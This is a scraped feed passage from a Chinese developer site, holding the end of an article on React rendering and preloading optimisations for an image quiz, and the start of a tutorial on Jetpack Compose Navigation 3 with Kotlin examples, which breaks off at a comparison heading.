<p>定位：<strong>不仅需要完美的视觉效果，还需要深入到了 React 性能优化底层。</strong></p>
<p>核心代码展示</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">const</span> <span class="hljs-title class_">StepItem</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">{ item, index, isActive, onBegin, onAnswer }</span>) =&gt;</span> {
  <span class="hljs-comment">// 合并动画状态为一个对象，减少状态更新次数</span>
  <span class="hljs-keyword">const</span> [animationState, setAnimationState] = <span class="hljs-title function_">useState</span>({
    <span class="hljs-attr">imageOpacity</span>: <span class="hljs-number">0</span>,
    <span class="hljs-attr">question1Opacity</span>: <span class="hljs-number">0</span>,
    <span class="hljs-attr">question2Opacity</span>: <span class="hljs-number">0</span>,
  });
  <span class="hljs-keyword">const</span> [imageLoaded, setImageLoaded] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-keyword">const</span> imageRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// 当组件变为激活状态时重置动画状态</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (isActive) {
      <span class="hljs-title function_">setAnimationState</span>({
        <span class="hljs-attr">imageOpacity</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">question1Opacity</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">question2Opacity</span>: <span class="hljs-number">0</span>,
      });
      <span class="hljs-title function_">setImageLoaded</span>(<span class="hljs-literal">false</span>);
    }
    <span class="hljs-comment">// 检查图片是否已经加载完成（处理缓存情况）</span>
    <span class="hljs-keyword">if</span> (isActive &amp;&amp; imageRef.<span class="hljs-property">current</span>) {
      <span class="hljs-comment">// 如果图片已经加载完成（从缓存中），立即设置加载状态</span>
      <span class="hljs-keyword">if</span> (imageRef.<span class="hljs-property">current</span>.<span class="hljs-property">complete</span> &amp;&amp; imageRef.<span class="hljs-property">current</span>.<span class="hljs-property">naturalHeight</span> !== <span class="hljs-number">0</span>) {
        <span class="hljs-title function_">setImageLoaded</span>(<span class="hljs-literal">true</span>);
      }
    }
  }, [isActive]);

  <span class="hljs-comment">// 处理动画序列</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (!isActive || !imageLoaded) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> timers = [];

    <span class="hljs-comment">// 立即显示图片</span>
    <span class="hljs-title function_">setAnimationState</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> ({ ...prev, <span class="hljs-attr">imageOpacity</span>: <span class="hljs-number">1</span> }));

    <span class="hljs-comment">// 延迟显示 question1</span>
    <span class="hljs-keyword">if</span> (item.<span class="hljs-property">question1</span>) {
      <span class="hljs-keyword">const</span> question1Timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title function_">setAnimationState</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> ({ ...prev, <span class="hljs-attr">question1Opacity</span>: <span class="hljs-number">1</span> }));

        <span class="hljs-comment">// question1 显示后，延迟显示 question2</span>
        <span class="hljs-keyword">if</span> (item.<span class="hljs-property">question2</span>) {
          <span class="hljs-keyword">const</span> question2Timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-title function_">setAnimationState</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> ({ ...prev, <span class="hljs-attr">question2Opacity</span>: <span class="hljs-number">1</span> }));
          }, <span class="hljs-number">500</span>);
          timers.<span class="hljs-title function_">push</span>(question2Timer);
        }
      }, <span class="hljs-number">500</span>);
      timers.<span class="hljs-title function_">push</span>(question1Timer);
    }

    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      timers.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">timer</span> =&gt;</span> <span class="hljs-built_in">clearTimeout</span>(timer));
    };
  }, [isActive, imageLoaded, item.<span class="hljs-property">question1</span>, item.<span class="hljs-property">question2</span>]);

  <span class="hljs-keyword">const</span> handleImageLoad = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">setImageLoaded</span>(<span class="hljs-literal">true</span>);
  }, []);

  <span class="hljs-keyword">const</span> stepClassName = <span class="hljs-title function_">useMemo</span>(
    <span class="hljs-function">() =&gt;</span>
      <span class="hljs-string">`step-content step<span class="hljs-subst">${index}</span> <span class="hljs-subst">${isActive ? <span class="hljs-string">'fade-enter-done'</span> : <span class="hljs-string">'fade-item'</span>}</span>`</span>,
    [index, isActive]
  );

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{stepClassName}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
        <span class="hljs-attr">ref</span>=<span class="hljs-string">{imageRef}</span>
        <span class="hljs-attr">className</span>=<span class="hljs-string">"image-bg"</span>
        <span class="hljs-attr">src</span>=<span class="hljs-string">{item.imgSrc}</span>
        <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>
        <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">opacity:</span> <span class="hljs-attr">animationState.imageOpacity</span> }}
        <span class="hljs-attr">onLoad</span>=<span class="hljs-string">{handleImageLoad}</span>
      /&gt;</span>
      {index === 0 &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onBegin}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"begin-testing"</span> /&gt;</span>}
      {item.question1 &amp;&amp; (
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
          <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onAnswer}</span>
          <span class="hljs-attr">className</span>=<span class="hljs-string">"question question1"</span>
          <span class="hljs-attr">src</span>=<span class="hljs-string">{item.question1}</span>
          <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>
          <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">opacity:</span> <span class="hljs-attr">animationState.question1Opacity</span> }}
        /&gt;</span>
      )}
      {item.question2 &amp;&amp; (
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
          <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onAnswer}</span>
          <span class="hljs-attr">className</span>=<span class="hljs-string">"question question2"</span>
          <span class="hljs-attr">src</span>=<span class="hljs-string">{item.question2}</span>
          <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>
          <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">opacity:</span> <span class="hljs-attr">animationState.question2Opacity</span> }}
        /&gt;</span>
      )}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
});

<span class="hljs-title class_">StepItem</span>.<span class="hljs-property">displayName</span> = <span class="hljs-string">'StepItem'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">Index</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> [currentStep, setCurrentStep] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> handleBeginTesting = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">setCurrentStep</span>(<span class="hljs-number">1</span>);
  }, []);

  <span class="hljs-keyword">const</span> handleAnsweringQuestion = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">setCurrentStep</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>);
  }, []);

  <span class="hljs-keyword">const</span> renderedItems = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">return</span> questionList
      .<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item, index</span>) =&gt;</span> ({ item, index }))
      .<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">{ index }</span>) =&gt;</span> index &lt;= currentStep + <span class="hljs-number">1</span>);
  }, [currentStep]);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"third-edition-container"</span>&gt;</span>
      {renderedItems.map(({ item, index }) =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">StepItem</span>
          <span class="hljs-attr">key</span>=<span class="hljs-string">{index}</span>
          <span class="hljs-attr">item</span>=<span class="hljs-string">{item}</span>
          <span class="hljs-attr">index</span>=<span class="hljs-string">{index}</span>
          <span class="hljs-attr">isActive</span>=<span class="hljs-string">{currentStep</span> === <span class="hljs-string">index}</span>
          <span class="hljs-attr">onBegin</span>=<span class="hljs-string">{handleBeginTesting}</span>
          <span class="hljs-attr">onAnswer</span>=<span class="hljs-string">{handleAnsweringQuestion}</span>
        /&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<h4 data-id="heading-10">以下是最终版的详细代码分析：</h4>
<p><strong>1. 性能优化组合</strong></p>
<ul>
<li>React.memo + useCallback：通过记忆化组件和持久化函数引用，确保当 currentStep 变化时，只有“当前活跃题”和“下一题”会触发必要的重绘，其他已加载的题目完全静止。</li>
</ul>
<p><strong>2. 状态对象化</strong></p>
<ul>
<li>将三个独立的 opacity 状态合并为 animationState 对象。这意味着原本需要三次 setState（触发三次渲染）的操作，现在只需一次即可完成。</li>
</ul>
<p><strong>3. 图片预加载与缓存策略</strong></p>
<ul>
<li><code>.filter(({ index }) =&gt; index &lt;= currentStep + 1)</code> 这一行代码实现了“只加载看过的”和“提前加载下一题”。这既节省了首屏流量，又保证了切换时的瞬间呈现。</li>
</ul>
<h3 data-id="heading-11">最终版--效果展示</h3>
<p><span href="https://code.juejin.cn/pen/7597005376978386970" class="code-editor-container"><iframe class="code-editor-frame" data-code="code-editor-element" data-code-id="7597005376978386970" data-src="https://code.juejin.cn/pen/7597005376978386970" style="display:none;" loading="lazy"/><span class="loading-placeholder" style="display:none"><img class="placeholder-image" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAYAAAA6/NlyAAAAJElEQVRoge3BMQEAAADCoPVP7WkJoAAAAAAAAAAAAAAAAAAAbjh8AAFte11jAAAAAElFTkSuQmCC" loading="lazy"/><span class="loading-logo"/></span></span></p>
<h2 data-id="heading-12">总结</h2>
<p>从最初的一个 map 一把梭，到最后引入 React.memo、资源预加载以及对缓存机制的深度打磨。从好用’和‘丝滑’的背后是极其严谨的性能管理。希望这份进阶之路能给你一些启发。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Compose Navigation 3 发布又要重新学了]]></title>    <link>https://juejin.cn/post/7596890557546528814</link>    <guid>https://juejin.cn/post/7596890557546528814</guid>    <pubDate>2026-01-20T01:48:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596890557546528814" data-draft-id="7596983314805964850" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Compose Navigation 3 发布又要重新学了"/> <meta itemprop="keywords" content="Android,Android Jetpack"/> <meta itemprop="datePublished" content="2026-01-20T01:48:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="黄林晴"/> <meta itemprop="url" content="https://juejin.cn/user/3985057546510423"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Compose Navigation 3 发布又要重新学了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3985057546510423/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    黄林晴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:48:57.000Z" title="Tue Jan 20 2026 01:48:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>2025 年 5 月，Google 在 I/O 大会上正式发布了 <strong>Jetpack Navigation 3</strong>，这是一个从零开始专为 Compose 构建的全新导航库。2026 年 1 月，JetBrains 发布的 Compose Multiplatform 1.10.0 也正式集成了 Navigation 3，标志着这一方案已进入生产就绪阶段。</p>
</blockquote>
<h2 data-id="heading-0">为什么需要 Navigation 3？</h2>
<p>老版 Jetpack Navigation 诞生于 2018 年，那时 Jetpack Compose 还未问世。尽管后来增加了 Compose 支持，但其核心设计理念与 Compose 的声明式编程模型存在根本冲突：</p>
<p><strong>Navigation 2 的痛点：</strong></p>
<ul>
<li>• 返回栈是个"黑盒"，只能间接观察状态</li>
<li>• 单目的地约束，难以实现自适应多窗格布局</li>
<li>• 复杂的 XML 导航图配置</li>
<li>• 与 Compose 的状态管理方式格格不入</li>
</ul>
<p><strong>Navigation 3 的设计哲学：</strong></p>
<ul>
<li>• <strong>开发者拥有返回栈</strong>：不再是库内部管理，而是你完全掌控</li>
<li>• <strong>最小化干预</strong>：提供可组合的构建块，而非一体化方案</li>
<li>• <strong>模块化组件</strong>：更小的、可组合的零件，便于自定义</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fdd9e7714e248c2bebd0cbb00b574ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6buE5p6X5pm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478537&amp;x-signature=iE4jwV9KquBOzTmE%2BtXF4xOsfxY%3D" alt="nav3_comparison.png" loading="lazy"/></p>
<h2 data-id="heading-1">快速上手：三步构建导航</h2>
<h3 data-id="heading-2">定义目的地 Key</h3>
<p>Navigation 3 使用 Kotlin 的 data class 或 data object 作为路由标识，参数直接内嵌其中：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> kotlinx.serialization.Serializable
<span class="hljs-keyword">import</span> androidx.navigation3.runtime.NavKey

<span class="hljs-comment">// 无参数页面</span>
<span class="hljs-meta">@Serializable</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">object</span> Home : NavKey

<span class="hljs-comment">// 带参数页面 - 参数直接定义在 data class 中</span>
<span class="hljs-meta">@Serializable</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductDetail</span>(
    <span class="hljs-keyword">val</span> productId: String,
    <span class="hljs-keyword">val</span> source: String = <span class="hljs-string">"home"</span>  <span class="hljs-comment">// 支持默认值</span>
) : NavKey

<span class="hljs-comment">// 复杂参数也不在话下</span>
<span class="hljs-meta">@Serializable</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProfile</span>(
    <span class="hljs-keyword">val</span> userId: <span class="hljs-built_in">Long</span>,
    <span class="hljs-keyword">val</span> showEditButton: <span class="hljs-built_in">Boolean</span> = <span class="hljs-literal">false</span>
) : NavKey
</code></pre>
<h3 data-id="heading-3">创建返回栈</h3>
<p>返回栈就是一个普通的可变列表，导航操作 = 列表操作：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">AppNavigation</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// 返回栈 - 就是个普通列表！</span>
    <span class="hljs-keyword">val</span> backStack = remember {
        mutableStateListOf&lt;NavKey&gt;(Home)
    }

    <span class="hljs-comment">// 导航到新页面 = 添加元素</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">navigateTo</span><span class="hljs-params">(destination: <span class="hljs-type">NavKey</span>)</span></span> {
        backStack.add(destination)
    }

    <span class="hljs-comment">// 返回 = 移除最后一个元素</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">goBack</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">if</span> (backStack.size &gt; <span class="hljs-number">1</span>) {
            backStack.removeAt(backStack.lastIndex)
        }
    }

    <span class="hljs-comment">// 带参数跳转示例</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">openProduct</span><span class="hljs-params">(productId: <span class="hljs-type">String</span>)</span></span> {
        backStack.add(ProductDetail(
            productId = productId,
            source = <span class="hljs-string">"catalog"</span>
        ))
    }
}
</code></pre>
<h3 data-id="heading-4">显示导航内容</h3>
<p>使用 <code>NavDisplay</code> 将返回栈渲染为 UI：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Composable</span>
fun AppNavigation() {
    val backStack = remember { mutableStateListOf&lt;NavKey&gt;(Home) }

    <span class="hljs-built_in">NavDisplay</span>(
        backStack = backStack,
        onBack = { backStack.removeLastOrNull() },
        entryProvider = { key -&gt;
            when (key) {
                is Home -&gt; <span class="hljs-built_in">NavEntry</span>(key) {
                    <span class="hljs-built_in">HomeScreen</span>(
                        onProductClick = { id -&gt;
                            backStack.add(ProductDetail(id))
                        }
                    )
                }
                is ProductDetail -&gt; <span class="hljs-built_in">NavEntry</span>(key) {
                    <span class="hljs-comment">// 参数直接从 key 中获取</span>
                    <span class="hljs-built_in">ProductScreen</span>(
                        productId = key.productId,
                        source = key.source,
                        onBack = { backStack.removeLastOrNull() }
                    )
                }
                is UserProfile -&gt; <span class="hljs-built_in">NavEntry</span>(key) {
                    <span class="hljs-built_in">ProfileScreen</span>(
                        userId = key.userId,
                        editable = key.showEditButton
                    )
                }
                else -&gt; <span class="hljs-built_in">NavEntry</span>(Unit) {
                    Text("未知页面")
                }
            }
        }
    )
}
</code></pre>
<h2 data-id="heading-5">参数传递：告别字符串拼接</h2>
<p>Navigation 3 的参数传递方式是其最大的改进之一。参数直接定义在路由的 data class 中，类型安全，编译期检查。</p>
<h3 data-id="heading-6">基础参数传递</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 定义带参数的路由</span>
<span class="hljs-meta">@Serializable</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderDetail</span>(
    <span class="hljs-keyword">val</span> orderId: String,
    <span class="hljs-keyword">val</span> fromNotification: <span class="hljs-built_in">Boolean</span> = <span class="hljs-literal">false</span>
) : NavKey

<span class="hljs-comment">// 跳转时传参</span>
backStack.add(OrderDetail(
    orderId = <span class="hljs-string">"ORD-2024-001"</span>,
    fromNotification = <span class="hljs-literal">true</span>
))

<span class="hljs-comment">// 目标页面直接使用</span>
<span class="hljs-keyword">is</span> OrderDetail -&gt; NavEntry(key) {
    OrderDetailScreen(
        orderId = key.orderId,           <span class="hljs-comment">// 直接访问</span>
        isFromNotification = key.fromNotification
    )
}
</code></pre>
<h3 data-id="heading-7">复杂对象传递</h3>
<p>对于复杂类型，可以序列化传递或使用 ID 查询：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 方式一：传递可序列化对象</span>
<span class="hljs-variable">@Serializable</span>
data class <span class="hljs-built_in">CheckoutScreen</span>(
    val <span class="hljs-attribute">items</span>: List&lt;CartItem&gt;,
    val <span class="hljs-attribute">couponCode</span>: String? = null
) : NavKey

<span class="hljs-comment">// 方式二：传递 ID，在目标页面获取完整数据（推荐）</span>
<span class="hljs-variable">@Serializable</span>
data class <span class="hljs-built_in">CheckoutScreen</span>(
    val <span class="hljs-attribute">cartId</span>: String
) : NavKey

<span class="hljs-comment">// 目标页面通过 ViewModel 获取数据</span>
is CheckoutScreen -&gt; <span class="hljs-built_in">NavEntry</span>(key) {
    <span class="hljs-selector-tag">val</span> <span class="hljs-selector-tag">viewModel</span>: <span class="hljs-selector-tag">CheckoutViewModel</span> = <span class="hljs-selector-tag">viewModel</span>()
    <span class="hljs-selector-tag">LaunchedEffect</span>(key.cartId) {
        <span class="hljs-selector-tag">viewModel</span><span class="hljs-selector-class">.loadCart</span>(key.cartId)
    }
    <span class="hljs-selector-tag">CheckoutContent</span>(viewModel)
}
</code></pre>
<h2 data-id="heading-8">ViewModel 集成</h2>
<p>Navigation 3 提供了开箱即用的 ViewModel 生命周期管理：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 添加依赖</span>
<span class="hljs-built_in">implementation</span>("androidx.lifecycle:lifecycle-viewmodel-navigation3:<span class="hljs-number">2.10</span>.<span class="hljs-number">0</span>")

<span class="hljs-comment">// 配置 NavDisplay</span>
<span class="hljs-built_in">NavDisplay</span>(
    backStack = backStack,
    onBack = { backStack.removeLastOrNull() },
    entryDecorators = <span class="hljs-built_in">listOf</span>(
        rememberSavedStateNavEntryDecorator(),     <span class="hljs-comment">// 状态保存</span>
        <span class="hljs-built_in">rememberViewModelStoreNavEntryDecorator</span>()  <span class="hljs-comment">// ViewModel 作用域</span>
    ),
    entryProvider = { key -&gt;
        when (key) {
            is ProductDetail -&gt; <span class="hljs-built_in">NavEntry</span>(key) {
                <span class="hljs-comment">// ViewModel 自动绑定到 NavEntry 生命周期</span>
                val viewModel: ProductViewModel = <span class="hljs-built_in">viewModel</span>()
                <span class="hljs-built_in">ProductScreen</span>(viewModel)
            }
        }
    }
)
</code></pre>
<p>ViewModel 会在对应的 NavEntry 从返回栈移除时自动清理，无需手动管理。</p>
<h2 data-id="heading-9">动画与过渡效果</h2>
<p>Navigation 3 内置了平滑的转场动画，支持预测性返回手势：</p>
<pre><code class="hljs language-ini" lang="ini">  NavDisplay(
    <span class="hljs-attr">backStack</span> = backStack,
    <span class="hljs-attr">onBack</span> = { backStack.removeLastOrNull() },
    <span class="hljs-attr">entryProvider</span> = entryProvider,
    // 自定义动画
    <span class="hljs-attr">transitionSpec</span> = {
        slideInHorizontally { it } togetherWith slideOutHorizontally { -it }
    }
)
</code></pre>
<h2 data-id="heading-10">对话框与底部弹窗</h2>
<pre><code class="hljs language-ini" lang="ini">// 定义对话框路由
@Serializable
data class ConfirmDialog(val message: String) : NavKey

// 使用 DialogSceneStrategy
NavDisplay(
    <span class="hljs-attr">backStack</span> = backStack,
    <span class="hljs-attr">sceneStrategy</span> = remember { DialogSceneStrategy() },
    <span class="hljs-attr">entryProvider</span> = { key -&gt;
        when (key) {
            is ConfirmDialog -&gt; NavEntry(
                <span class="hljs-attr">key</span> = key,
                <span class="hljs-attr">metadata</span> = DialogSceneStrategy.dialog()  // 标记为对话框
            ) {
                AlertDialog(
                    <span class="hljs-attr">onDismissRequest</span> = { backStack.removeLastOrNull() },
                    <span class="hljs-attr">title</span> = { Text(<span class="hljs-string">"确认"</span>) },
                    <span class="hljs-attr">text</span> = { Text(key.message) },
                    <span class="hljs-attr">confirmButton</span> = { /* ... */ }
                )
            }
        }
    }
)
</code></pre>
<h2 data-id="heading-11">与 Navigation 2 的核心差异</h2>













































